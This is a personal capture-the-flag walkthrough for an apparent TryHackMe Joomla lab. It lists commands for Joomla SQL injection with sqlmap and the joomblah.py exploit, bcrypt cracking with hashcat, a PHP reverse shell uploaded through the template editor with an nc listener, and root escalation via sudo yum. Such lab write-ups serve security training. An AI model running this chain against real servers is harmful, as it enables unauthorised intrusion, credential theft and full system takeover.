export ip=10.10.166.164

# recon and scanning

## nmap
- `sudo nmap -sC -sV -oA nmap/nmap.log --script="default and discovery" $ip --vv`

## cmseek
- `cmseek -u $ip`
  - outputs version 3.7.0

## sqlmap
- `sqlmap -u "http://$ip/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]`


# process
- searching the joomla version in searchsploit shows, it is vulnerable version and this exploit gives a sqlmap command to exploit joomla
  - `sqlmap -u "http://$ip/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]`
- while it was running I went back to the tryhackme page and there it was asking not to use sqlmap and use a python script instead. so I went ahead and search for the given CVE in the exploit shown by searchsploit and go a github repo with a python script to exploit it.
  - `python3 joomblah.py http://$ip`
- Got the hash and now using hashat to crack it. After looking at the [hashcat hash examples page](https://hashcat.net/wiki/doku.php?id=example_hashes), I was convinced that this is a bcyrpt hash.
  - `hashcat -m 3200 hash.txt rockyou.txt -S`
  - That cracked the password in around 10 mins.
- logged into $ip/administrator
- looked into the theme name from the source of the joomla home page.
- now in the admin section of the page, go to the template customize page and upload a new file into the root dir of theme.
  - the path of all the css files for this current theme is evident after looking at the source of the joomla home page.
    - $ip/templates/protostar/
  - create an empty file with any name(note down this name) and add the content of the [reverse shell you downloaded](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) in here. Change the ip with your attack box's ip and any port
  - now start an `nc` listener with the port you added in the reverseshell
    - `nc -lnvp 4444`
  - access the uploaded reverseshell using the file name you gave in the `add a new file page` under templates
    - MY URL: `http://$ip/templates/protostar/sh.php`
  - ran linpeas.sh after starting an http server on the host and downloading the linpeas.sh file from the reverseshell into `/dev/shm/`
  - this revealed a password using which I tried to loginto jjames's account via SSH and I got it.
  - The home dir had the second flag.
  - tried to see what all commands can be used with sudo and found we can use yum with sudo
    - `sudo -l`
  - so search for [gtfobins](https://gtfobins.github.io/gtfobins/yum/#sudo) to see if we can somehow spawn a root shell and found couple of ways one which which worked.
  - in the home dir or root our last flag was waiting... ;)